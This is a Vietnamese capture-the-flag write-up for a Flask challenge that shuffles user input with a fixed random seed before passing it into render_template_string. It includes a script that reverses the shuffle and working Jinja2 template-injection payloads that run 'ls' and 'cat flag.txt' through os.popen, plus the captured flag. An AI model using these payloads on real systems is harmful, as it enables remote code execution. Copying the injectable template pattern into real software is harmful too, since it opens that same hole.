# Đề bài: 
![Screenshot (463)](https://github.com/ductohno/ehc-adward/assets/152991010/9d62b2de-7258-45b1-aa11-213492bfbb30)
# Source code:
```
import random

from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)

@app.get('/')
def root():
    return render_template_string('''
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;">{{ error }}</div>
        </div>
    ''', error=request.args.get('error', ''))

@app.post('/shout')
def shout():
    text = request.form.get('text', '')
    if not text:
        return redirect('/?error=No message provided...')

    random.seed(0)
    jumbled = list(text)
    random.shuffle(jumbled)
    jumbled = ''.join(jumbled)

    return render_template_string('''
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;">{{ error }}</div>
            <div>
                Your voice echoes back: %s
            </div>
        </div>
    ''' % jumbled, error=request.args.get('error', ''))

@app.get('/style.css')
def style():
    return '''
        html, body { margin: 0 }
        .content {
            padding: 2rem;
            width: 90%;
            max-width: 900px;
            margin: auto;
            font-family: Helvetica, sans-serif;
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
    '''
```
# Hướng làm:
- Trước tiên là phải đọc source code, ta có 2 parameter để chọn, đó là error và đoạn mà mình nhập vào, mình sẽ gọi tạm là %s
- Mình sẽ chọn biến %s để khai thác do nó đi qua server trước khi in ra kết quả
- Tiếp theo, ta để ý hàm random, random với seed cố định (ở đây là 0) thì sẽ luôn cho ra cùng 1 kết quả nếu nhập vào 1 chuỗi nhất định
- Lỗ hổng của bài là ssti do kết quả được gửi đi không hề có filter
=> Hướng làm: Tìm cách tìm ra 1 string mà khi gửi ấn shout thì nó sẽ gửi đi ssti payload, và ta có code sau để làm việc đó (by chatgpt):

# Code:
```
import random

def shuffle_string_with_indices(text, seed_value):
    random.seed(seed_value)
    indices = list(range(len(text)))
    random.shuffle(indices)
    shuffled = ''.join([text[i] for i in indices])
    return shuffled, indices
def unshuffle_string(shuffled_text, indices):
    original_list = [''] * len(shuffled_text)
    for i, index in enumerate(indices):
        original_list[index] = shuffled_text[i]
    return ''.join(original_list)
def find_original_string_from_target(target_text, seed_value):
    random.seed(seed_value)
    indices = list(range(len(target_text)))
    random.shuffle(indices)
 
    original_list = [''] * len(target_text)
    for i, index in enumerate(indices):
        original_list[index] = target_text[i]
    
    original_text = ''.join(original_list)
    return original_text, indices


target_text = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"    #target code
seed_value = 0        # seed number


original_text, indices = find_original_string_from_target(target_text, seed_value)

print("Target:", target_text)
print("Indices:", indices)            
print("Original_text:", original_text)            #text which random become target_text

shuffled_text, _ = shuffle_string_with_indices(original_text, seed_value)
```
# Khai thác:
- Thử trước với payload {{7*7}}, chạy code ta được: *7{}{7}, dán vô thì ta có:

![Screenshot (465)](https://github.com/ductohno/ehc-adward/assets/152991010/cfe70f54-b8ec-4437-8667-0774560ef94f)

- Time to rce, chọn payload self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()
- Chạy code: l_ot( osn'_.(.__isgsi_pleu.)sttln)prlie___ _{.'l_}sa.}o_{)e__rd_'(_'fmob.painib_

![Screenshot (466)](https://github.com/ductohno/ehc-adward/assets/152991010/fd24eafc-9bf2-4527-91f2-6df80cf5266a)

- Tiếp theo thì cat the flag thôi
- Chạy code:  t___i _{{a.lg)ls(xfep_.lbpf'o s_a)_'t_e p_cgs.ooi}ia_}b___._'rdmt(iulon(lt)..teannist.'r__

![Screenshot (467)](https://github.com/ductohno/ehc-adward/assets/152991010/f48813bd-bcdd-49fc-9116-3215bad469be)

# Flag:
actf{2cb542c944f737b85c6bb9183b7f2ea8}


